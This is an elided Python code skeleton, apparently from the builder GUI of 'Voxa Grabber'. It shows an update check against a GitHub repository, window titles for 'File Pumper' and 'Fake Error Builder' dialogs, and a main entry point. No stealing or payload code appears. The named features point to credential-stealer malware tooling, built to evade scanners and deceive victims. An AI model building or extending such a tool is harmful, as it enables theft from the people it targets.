		...
		if Settings.UpdatesCheck:
			...
			if os.path.isfile(hashFilePath):
				...
				try:
					...
					newhash = json.loads(http.request("GET", "https://raw.githubusercontent.com/Voxa-c/Voxa-Grabber/main/Voxa%20Grabber/Extras/hash", timeout= 5).data.decode())["hash"]
...
class PumperSettings(ctk.CTkToplevel):
	...
	def __init__(self, master) -> None:
		...
		self.title("Voxa  Grabber [File Pumper]")
...
class FakeErrorBuilder(ctk.CTkToplevel):
	...
	def __init__(self, master) -> None:
		super().__init__(master)
		self.title("Voxa Grabber [Fake Error Builder]")
		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
		self.grab_set()
...
class Builder(ctk.CTk):
	...
	def __init__(self) -> None:
		...
		self.title("Voxa Grabber [Builder]")
		...
		self.titleLabel = ctk.CTkLabel(self, text= "Voxa Grabber", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#2F58CD")
...
if __name__ == "__main__":
	...
	if os.name == "nt":
		...
		if Utility.CheckForUpdates():
			...
			if response:
				webbrowser.open_new_tab("https://github.com/Voxa-c/Voxa-Grabber")
				exit(0)
